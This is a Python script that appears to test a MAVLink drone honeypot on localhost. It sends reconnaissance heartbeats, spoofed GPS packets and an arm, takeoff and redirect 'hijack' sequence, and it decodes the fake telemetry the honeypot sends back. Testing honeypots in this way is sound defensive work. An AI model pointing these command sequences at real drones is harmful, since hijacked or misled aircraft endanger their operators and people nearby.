#!/usr/bin/env python3
"""
MAVLink Attack Simulator with Response Decoding
Shows exactly what fake data the honeypot sends back to the attacker
"""

import socket
import struct
import time
import random
import sys

# MAVLink message names
MSG_NAMES = {
    0: "HEARTBEAT",
    24: "GPS_RAW_INT",
    76: "COMMAND_LONG",
    84: "SET_POSITION_TARGET_LOCAL_NED",
    86: "SET_POSITION_TARGET_GLOBAL_INT",
    147: "BATTERY_STATUS",
    400: "ARM_DISARM",
}

# MAV_TYPE names
MAV_TYPES = {0: "GENERIC", 1: "FIXED_WING", 2: "QUADROTOR", 6: "GCS", 13: "HEXAROTOR"}
MAV_MODES = {0: "PREFLIGHT", 1: "MANUAL", 65: "STABILIZE", 81: "GUIDED", 209: "ARMED+GUIDED"}


def decode_mavlink_responses(data):
    """Parse and decode all MAVLink messages in raw bytes"""
    responses = []
    i = 0
    
    while i < len(data):
        # Look for MAVLink start byte
        if data[i] != 0xFE:
            i += 1
            continue
        
        if i + 6 > len(data):
            break
        
        payload_len = data[i + 1]
        seq = data[i + 2]
        sys_id = data[i + 3]
        comp_id = data[i + 4]
        msg_id = data[i + 5]
        
        # Check if we have full message
        msg_end = i + 6 + payload_len + 2  # header + payload + checksum
        if msg_end > len(data):
            break
        
        payload = data[i + 6 : i + 6 + payload_len]
        msg_name = MSG_NAMES.get(msg_id, f"UNKNOWN({msg_id})")
        
        decoded = {
            "msg_id": msg_id,
            "msg_name": msg_name,
            "seq": seq,
            "sys_id": sys_id,
            "payload_len": payload_len,
        }
        
        # Decode specific message types
        if msg_id == 0 and payload_len >= 9:  # HEARTBEAT
            custom_mode, mav_type, autopilot, base_mode, status, version = struct.unpack('<IBBBBB', payload[:9])
            decoded["details"] = {
                "type": MAV_TYPES.get(mav_type, f"TYPE_{mav_type}"),
                "base_mode": MAV_MODES.get(base_mode, f"MODE_{base_mode}"),
                "custom_mode": custom_mode,
                "status": status,
                "armed": bool(base_mode & 128),
            }
        
        elif msg_id == 24 and payload_len >= 30:  # GPS_RAW_INT
            time_usec, lat, lon, alt, eph, epv, vel, cog, fix, sats = struct.unpack('<QiiiHHHHBB', payload[:30])
            decoded["details"] = {
                "latitude": lat / 1e7,
                "longitude": lon / 1e7,
                "altitude_m": alt / 1000.0,
                "speed_m/s": vel / 100.0,
                "heading_deg": cog / 100.0,
                "fix_type": ["No Fix", "No Fix", "2D", "3D"][min(fix, 3)],
                "satellites": sats,
            }
        
        elif msg_id == 147 and payload_len >= 16:  # BATTERY_STATUS
            consumed, energy, temp = struct.unpack('<iih', payload[:10])
            decoded["details"] = {
                "consumed_mAh": consumed,
                "energy_consumed": energy,
                "temperature_C": temp / 100.0 if temp != -1 else "N/A",
                "battery_%_approx": round(consumed / 100.0, 1),
            }
        
        responses.append(decoded)
        i = msg_end
    
    return responses


def print_response(resp):
    """Pretty-print a decoded MAVLink response"""
    print(f"    ├─ 📡 {resp['msg_name']} (id={resp['msg_id']}, seq={resp['seq']})")
    
    if "details" in resp:
        details = resp["details"]
        if resp["msg_id"] == 0:  # HEARTBEAT
            armed = "🔴 ARMED" if details["armed"] else "🟢 DISARMED"
            print(f"    │    Type: {details['type']} | Mode: {details['base_mode']} | {armed}")
        
        elif resp["msg_id"] == 24:  # GPS
            print(f"    │    📍 GPS: {details['latitude']:.6f}°, {details['longitude']:.6f}°")
            print(f"    │    📏 Alt: {details['altitude_m']:.1f}m | Speed: {details['speed_m/s']:.1f}m/s | Heading: {details['heading_deg']:.0f}°")
            print(f"    │    🛰️  Fix: {details['fix_type']} | Satellites: {details['satellites']}")
        
        elif resp["msg_id"] == 147:  # BATTERY
            print(f"    │    🔋 Battery: ~{details['battery_%_approx']}% | Consumed: {details['consumed_mAh']}mAh")


class MAVLinkAttackSimulator:
    """Simulates various MAVLink attacks and decodes honeypot responses"""
    
    def __init__(self, target_host="127.0.0.1", target_port=5760):
        self.target_host = target_host
        self.target_port = target_port
        self.seq = 0
    
    def craft_message(self, msg_id, payload=b''):
        """Craft a MAVLink 1.0 message"""
        msg = bytearray([
            0xFE,
            len(payload),
            self.seq % 256,
            255,   # System ID (attacker)
            1,     # Component ID
            msg_id
        ])
        msg.extend(payload)
        msg.extend(b'\x00\x00')  # Checksum placeholder
        self.seq += 1
        return bytes(msg)
    
    def send_and_receive(self, sock, msg_id, payload=b'', label=""):
        """Send a MAVLink message and decode the honeypot's response"""
        msg = self.craft_message(msg_id, payload)
        sock.send(msg)
        
        msg_name = MSG_NAMES.get(msg_id, f"MSG_{msg_id}")
        print(f"\n  📤 SENT: {msg_name} (id={msg_id}) {label}")
        print(f"     Bytes: {len(msg)} | Hex: {msg[:20].hex()}...")
        
        # Wait for and decode response
        time.sleep(0.5)
        try:
            sock.settimeout(2.0)
            response_data = sock.recv(4096)
            
            if response_data:
                print(f"\n  📥 RECEIVED: {len(response_data)} bytes from honeypot")
                print(f"     Raw hex: {response_data[:40].hex()}{'...' if len(response_data) > 40 else ''}")
                
                decoded = decode_mavlink_responses(response_data)
                if decoded:
                    print(f"     Decoded {len(decoded)} MAVLink message(s):")
                    for resp in decoded:
                        print_response(resp)
                else:
                    print(f"     ⚠️  Could not decode response (garbled/corrupted)")
            else:
                print(f"\n  📥 No response (honeypot may be in CRASHED state)")
        
        except socket.timeout:
            print(f"\n  📥 No response (timeout - honeypot not responding)")
        except Exception as e:
            print(f"\n  ❌ Error receiving: {e}")
    
    def attack_hijack_sequence(self):
        """Simulate drone hijack sequence"""
        print(f"\n{'='*60}")
        print(f"  🎯 ATTACK: DRONE HIJACK SEQUENCE")
        print(f"  Target: {self.target_host}:{self.target_port}")
        print(f"{'='*60}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_host, self.target_port))
        
        try:
            # Step 1: ARM
            print(f"\n  {'─'*50}")
            print(f"  Step 1/3: ARM DRONE")
            arm_payload = struct.pack('<fffffffHBB', 1.0, 0, 0, 0, 0, 0, 0, 400, 1, 1)
            self.send_and_receive(sock, 76, arm_payload, "[COMMAND_LONG → ARM]")
            time.sleep(1)
            
            # Step 2: TAKEOFF
            print(f"\n  {'─'*50}")
            print(f"  Step 2/3: TAKEOFF")
            takeoff_payload = struct.pack('<fffffffHBB', 0, 0, 0, 0, 0, 0, 10.0, 22, 1, 1)
            self.send_and_receive(sock, 76, takeoff_payload, "[COMMAND_LONG → TAKEOFF]")
            time.sleep(1)
            
            # Step 3: SET POSITION (redirect drone)
            print(f"\n  {'─'*50}")
            print(f"  Step 3/3: REDIRECT TO NEW POSITION")
            ts = int(time.time() * 1000) % 4294967295
            pos_payload = struct.pack('<IiiifffHBB', ts, 370000000, -1220000000, 100000, 0, 0, 0, 0x0FF8, 1, 1)
            self.send_and_receive(sock, 86, pos_payload, "[SET_POSITION → REDIRECT]")
            
            print(f"\n{'='*60}")
            print(f"  ✅ HIJACK SEQUENCE COMPLETE")
            print(f"{'='*60}")
        except Exception as e:
            print(f"\n  ❌ Error: {e}")
        finally:
            sock.close()
    
    def attack_reconnaissance(self, num_probes=5):
        """Simulate reconnaissance / network scan"""
        print(f"\n{'='*60}")
        print(f"  🔍 ATTACK: RECONNAISSANCE SWEEP")
        print(f"  Target: {self.target_host}:{self.target_port}")
        print(f"{'='*60}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_host, self.target_port))
        
        try:
            for i in range(num_probes):
                print(f"\n  {'─'*50}")
                print(f"  Probe {i+1}/{num_probes}")
                
                # Send HEARTBEAT request (msg_id=0)
                self.send_and_receive(sock, 0, b'\x00' * 9, "[HEARTBEAT PROBE]")
                time.sleep(0.5)
            
            print(f"\n{'='*60}")
            print(f"  ✅ RECON SWEEP COMPLETE")
            print(f"{'='*60}")
        except Exception as e:
            print(f"\n  ❌ Error: {e}")
        finally:
            sock.close()
    
    def attack_gps_spoof(self, num_packets=5):
        """Simulate GPS spoofing attack"""
        print(f"\n{'='*60}")
        print(f"  📍 ATTACK: GPS SPOOFING")
        print(f"  Target: {self.target_host}:{self.target_port}")
        print(f"{'='*60}")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target_host, self.target_port))
        
        try:
            fake_lat = 400000000  # 40.000° N
            fake_lon = -740000000  # -74.000° W (NYC)
            
            for i in range(num_packets):
                print(f"\n  {'─'*50}")
                print(f"  Spoof Packet {i+1}/{num_packets}")
                
                # GPS_INPUT (msg_id=132)
                gps_payload = struct.pack('<QiiiHHHHBB',
                    int(time.time() * 1e6) % (2**64),
                    fake_lat + random.randint(-100, 100),
                    fake_lon + random.randint(-100, 100),
                    50000,  # 50m alt
                    100, 100,  # hdop, vdop
                    500,  # vel
                    18000,  # heading 180°
                    3,  # 3D fix
                    10  # sats
                )
                self.send_and_receive(sock, 132, gps_payload, f"[GPS_INPUT → FAKE COORDS]")
                time.sleep(0.5)
            
            print(f"\n{'='*60}")
            print(f"  ✅ GPS SPOOFING COMPLETE")
            print(f"{'='*60}")
        except Exception as e:
            print(f"\n  ❌ Error: {e}")
        finally:
            sock.close()

    def run_all_attacks(self):
        """Run all attack types"""
        print(f"\n{'#'*60}")
        print(f"  🚀 RUNNING ALL ATTACK SCENARIOS")
        print(f"  Target: {self.target_host}:{self.target_port}")
        print(f"{'#'*60}")
        
        self.attack_reconnaissance(3)
        time.sleep(2)
        self.attack_gps_spoof(3)
        time.sleep(2)
        self.attack_hijack_sequence()
        
        print(f"\n{'#'*60}")
        print(f"  🏁 ALL ATTACKS COMPLETED")
        print(f"{'#'*60}")


if __name__ == "__main__":
    sim = MAVLinkAttackSimulator()
    
    if len(sys.argv) > 1:
        cmd = sys.argv[1].lower()
        if cmd == "recon":
            sim.attack_reconnaissance()
        elif cmd == "gps":
            sim.attack_gps_spoof()
        elif cmd == "hijack":
            sim.attack_hijack_sequence()
        elif cmd == "all":
            sim.run_all_attacks()
        else:
            print("Usage: python3 attack_simulator_fixed.py [recon|gps|hijack|all]")
    else:
        sim.run_all_attacks()